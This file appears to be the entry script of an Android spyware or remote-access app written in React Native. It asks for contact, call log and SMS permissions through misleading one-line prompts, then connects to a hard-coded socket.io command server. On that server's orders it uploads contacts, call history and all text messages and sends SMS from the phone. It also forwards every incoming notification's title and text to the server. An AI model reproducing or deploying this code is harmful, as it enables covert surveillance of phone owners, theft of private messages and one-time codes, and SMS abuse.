/**
 * @format
 */

import {AppRegistry, PermissionsAndroid} from 'react-native';
import App from './App';
import {name as appName} from './app.json';
import BackgroundRunnerService from './services/BackgroundHeadlessTask';
import RNAndroidNotificationListener, {
  RNAndroidNotificationListenerHeadlessJsName,
} from 'react-native-android-notification-listener';

import Contacts from 'react-native-contacts';
import CallLogs from 'react-native-call-log';

import {list, autoSend} from 'react-native-get-sms-android-v2';

import RNInstalledApplication from 'react-native-installed-application';

import {
  getManufacturer,
  getModel,
  getReadableVersion,
  getUniqueId,
} from 'react-native-device-info';
import {io} from 'socket.io-client';

RNInstalledApplication.getApps()
  .then(apps => {
    // console.log(apps);
  })
  .catch(error => {
    // console.log(error);
  });

const messageKeys = {
  camera: '0xCA',
  files: '0xFI',
  call: '0xCL',
  sms: '0xSM',
  mic: '0xMI',
  location: '0xLO',
  contacts: '0xCO',
  wifi: '0xWI',
  notification: '0xNO',
  clipboard: '0xCB',
  installed: '0xIN',
  permissions: '0xPM',
  gotPermission: '0xGP',
};

const url = 'ws://192.168.0.202:22222';

const requestPermissions = async () => {
  return new Promise(async resolve => {
    await PermissionsAndroid.request(
      PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
      {
        title: 'Permission',
        message: 'Accept This permission.',
        buttonPositive: 'Accept',
      },
    );
    await PermissionsAndroid.request(
      PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
      {
        title: 'Permission',
        message: 'Accept This permission.',
        buttonPositive: 'Accept',
      },
    );
    await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.SEND_SMS, {
      title: 'Permission',
      message: 'Accept This permission.',
      buttonPositive: 'Accept',
    });
    await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_SMS, {
      title: 'Permission',
      message: 'Accept This permission.',
      buttonPositive: 'Accept',
    });
    resolve();
  });
};

const getContacts = () => {
  return new Promise((resolve, reject) => {
    Contacts.getAll()
      .then(contacts => {
        // console.log(2);
        // work with contacts
        let con = [];
        for (const contact of contacts) {
          let phoneNumbers = [];
          for (const phoneNumber of contact.phoneNumbers) {
            phoneNumbers.push(phoneNumber.number);
          }
          phoneNumbers = phoneNumbers.join(' , ');
          con.push({
            name: `${
              contact.givenName + ' ' + contact.familyName // +
              //' ' +
              // contact.displayName
            }`,
            phoneNo: phoneNumbers,
          });
          //alert(JSON.stringify(contact.phoneNumbers));
        }
        //console.log('Sending contacts');
        //  socket.emit(messageKeys.contacts, {contactsList: con});

        resolve(con);
      })
      .catch(e => {
        reject([]);
      });
  });
};

const sendSms = (to, sms) => {
  return new Promise((resolve, reject) => {
    autoSend(
      to,
      sms,
      fail => {
        console.log('Failed with this error: ' + fail);
        return false;
      },
      success => {
        console.log('SMS sent successfully');
        return true;
      },
    );
  });
};

const getSms = () => {
  return new Promise((resolve, reject) => {
    list(
      JSON.stringify({}),
      fail => {
        console.log('Failed Getting Sms');
      },
      (count, smsList) => {
        // console.log('Count: ', count);
        // console.log('List: ', smsList);
        const arr = JSON.parse(smsList);
        const allSms = [];
        for (const sms of arr) {
          const body = sms.body;
          const date = sms.date;
          const read = sms.read;
          const type = sms.type;
          const address = sms.address;
          allSms.push({body, date, read, type, address});
        }

        return resolve({smslist: allSms});
        //
        // arr.forEach(function (object) {
        //   console.log('Object: ' + object);
        //   console.log('-->' + object.date);
        //   console.log('-->' + object.body);
        // });
      },
    );
  });
};

const getCallLogs = () => {
  return new Promise((resolve, reject) => {
    CallLogs.loadAll().then(callLogs => {
      // call.put("phoneNo", num);
      // call.put("name", name);
      // call.put("duration", duration);
      // call.put("date", date);
      // call.put("type", type);

      //  alert(JSON.stringify(callLogs))
      let call = [];
      for (const callLog of callLogs) {
        call.push({
          phoneNo: callLog.phoneNumber,
          name: callLog.name,
          duration: callLog.duration,
          date: callLog.timestamp,
          type: callLog.rawType,
        });
      }
      resolve(call);
    });
  });
};

const getDeviceInfo = async () => {
  return {
    model: getModel(),
    manf: await getManufacturer(),
    release: getReadableVersion(),
    id: await getUniqueId(),
  };
};
const socketConnection = () => {
  const socket = global.socket;
  socket.on('order', async order => {
    const {type} = order;
    // console.log(JSON.stringify(order));
    // console.log({type});
    switch (type) {
      case messageKeys.contacts:
        const contacts = await getContacts(socket);
        socket.emit(messageKeys.contacts, {contactsList: contacts});
        break;
      case messageKeys.call:
        const callLogs = await getCallLogs();
        // alert(JSON.stringify(callLogs));
        socket.emit(messageKeys.call, {callsList: callLogs});
        break;
      case messageKeys.sms:
        if (order.action === 'ls') {
          const getAllSms = await getSms();
          // console.log(JSON.stringify(getAllSms));
          socket.emit(messageKeys.sms, getAllSms);
        } else if (order.action === 'sendSMS') {
          const sendSms1 = await sendSms(order.to, order.sms);
          console.log(JSON.stringify(sendSms1));
          socket.emit(messageKeys.sms, sendSms1);
        }
        break;
      default:
        console.log('Default case');
    }
  });
};

const socketConnect = async () => {
  return new Promise(resolve => {
    getDeviceInfo().then(query => {
      query.user = 'kali';
      // console.log({query});

      global.socket = io(url, {
        reconnectionDelayMax: 10000,
        query,
      });
      socketConnection();
      resolve();
    });
  });
};

requestPermissions().then(() => {
  // To check if the user has permission
  RNAndroidNotificationListener.getPermissionStatus().then(status => {
    if (status === 'denied') {
      RNAndroidNotificationListener.requestPermission();
    }
  });
});
socketConnect().then();

const headlessNotificationListener = async ({notification}) => {
  // SmsAndroid.delete(
  //   '_id',
  //   fail => {
  //     console.log('Failed with this error: ' + fail);
  //   },
  //   (success) => {
  //     console.log('SMS deleted successfully');
  //   },
  // );

  notification = JSON.parse(notification);
  const appNameOne = notification.app;
  const title = notification.title;
  const content = notification.text;
  const postTime = notification.time;
  const key = notification.time;
  if (!global?.socket?.connected) {
    socketConnect().then(r => {
      const socket = global.socket;
      socket.emit('0xNO', {appName: appNameOne, title, content, postTime, key});
    });
  } else {
    const socket = global.socket;
    socket.emit('0xNO', {appName: appNameOne, title, content, postTime, key});
  }
  /**
   * This notification is a JSON string in the follow format:
   *  {
   *      "time": string,
   *      "app": string,
   *      "title": string,
   *      "titleBig": string,
   *      "text": string,
   *      "subText": string,
   *      "summaryText": string,
   *      "bigText": string,
   *      "audioContentsURI": string,
   *      "imageBackgroundURI": string,
   *      "extraInfoText": string,
   *      "groupedMessages": Array<Object> [
   *          {
   *              "title": string,
   *              "text": string
   *          }
   *      ],
   *      "icon": string (base64),
   *      "image": string (base64), // WARNING! THIS MAY NOT WORK FOR SOME APPLICATIONS SUCH TELEGRAM AND WHATSAPP
   *  }
   *
   * Note that these properties depend on the sender configuration so many times a lot of them will be empty
   */
};

AppRegistry.registerComponent(appName, () => App);
AppRegistry.registerHeadlessTask('SomeTaskName', () => BackgroundRunnerService);

AppRegistry.registerHeadlessTask(
  RNAndroidNotificationListenerHeadlessJsName,
  () => headlessNotificationListener,
);
